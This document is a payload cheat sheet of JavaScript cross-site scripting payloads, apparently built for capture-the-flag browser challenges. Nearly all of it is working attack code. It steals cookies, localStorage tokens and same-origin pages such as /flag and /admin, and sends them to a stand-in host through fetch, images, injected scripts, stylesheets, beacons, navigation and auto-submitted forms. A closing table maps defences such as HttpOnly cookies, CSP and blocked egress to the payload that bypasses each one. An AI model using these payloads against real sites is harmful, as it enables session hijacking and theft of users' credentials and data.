# Payload dictionary — the payload set, indexed

## Canaries

```javascript
console.log('hit');                                    // console proof
document.title='X';document.body.setAttribute('d','1'); // DOM proof
fetch('https://T/c');new Image().src='https://T/c';     // network proof
window.__e=[];window.onerror=m=>__e.push(m);            // error hook
```

## Context dumpers

```javascript
return {url:location.href,origin:location.origin,inIframe:self!==top,
  cookie:document.cookie,ls:Object.keys(localStorage),ua:navigator.userAgent,
  webdriver:navigator.webdriver};
```

## Cookie/storage exfil

```javascript
fetch('https://T/?c='+encodeURIComponent(document.cookie));
fetch('https://T/?ls='+encodeURIComponent(JSON.stringify(localStorage)));
fetch('https://T/?t='+encodeURIComponent(localStorage.token));
```

## Same-origin read + exfil

```javascript
fetch('/flag').then(r=>r.text()).then(t=>fetch('https://T/?f='+btoa(t)));
fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://T/?d='+btoa(t)));
fetch('/admin').then(r=>r.text()).then(t=>{
  var m=t.match(/flag\{[^}]+\}/);if(m)fetch('https://T/?f='+btoa(m[0]));
});
```

## Egress-blocked (write-back)

```javascript
fetch('/api/profile',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:document.cookie})});
fetch('/api/notes',{method:'POST',body:'n='+document.cookie});
fetch('/api/settings',{method:'POST',body:'x='+localStorage.token});
```

## CSP-loose subresources

```javascript
new Image().src='https://T/i.png?c='+document.cookie;
var s=document.createElement('script');s.src='https://T/j.js?c='+document.cookie;document.body.append(s);
var l=document.createElement('link');l.rel='stylesheet';l.href='https://T/s.css?c='+document.cookie;document.head.append(l);
```

## Fire-and-forget / navigation

```javascript
navigator.sendBeacon('https://T/?c='+document.cookie);
top.location='https://T/?c='+encodeURIComponent(document.cookie);
window.open('https://T/?c='+document.cookie);
var f=document.createElement('form');f.action='https://T/';f.method='POST';
var i=document.createElement('input');i.name='c';i.value=document.cookie;
f.append(i);document.body.append(f);f.submit();
```

## WebDriver `execute` reads

```bash
return document.cookie;
return JSON.stringify(localStorage);
return fetch('/flag').then(r=>r.text());         # via execute/async
return fetch('file:///flag').then(r=>r.text());  # JS file read
```

## The dictionary-to-constraint map

| Constraint | Dictionary entry |
|---|---|
| just proving exec | canaries |
| flag is cookie | cookie exfil |
| cookie HttpOnly | jar / same-origin ride |
| egress blocked | write-back |
| CSP blocks fetch | subresources |
| short wait | beacon/Image |
| flag is same-origin | read+exfil |
| need browser's own read | execute |
